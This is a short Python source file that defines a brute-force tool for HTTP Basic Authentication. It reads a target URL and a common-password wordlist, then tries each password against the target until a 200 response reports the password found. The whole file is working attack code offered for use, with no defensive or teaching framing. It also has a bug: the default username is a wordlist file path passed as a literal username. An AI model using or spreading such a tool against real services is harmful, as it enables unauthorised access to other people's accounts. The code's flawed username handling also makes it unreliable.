def bruteforcer():
    import requests
    from requests.auth import HTTPBasicAuth
    target = input("Enter target URL: ")
    passList = input("Enter path to passlist file ( press enter to use Default) : ")
    if passList == "":
        passList = "Dics\\PassLists\\10k-most-common.txt"
    else:
        pass
    user = input("Enter username( press enter to use Default): ")
    if user == "":
        user = "Dics\\UserNames\\top-usernames-shortlist.txt"
    else:
        pass
    with open(passList , 'r') as passwords:
        for password in passwords.readlines():
            password = password.strip()
            req = requests.get(target, auth=HTTPBasicAuth(user, password))

            if req.status_code == 401:
                print("Login failed with => ", password)
            elif req.status_code == 200:
                print('Password found => ', password)
                break
            else:
                print(req.status_code, " error! ")
                break
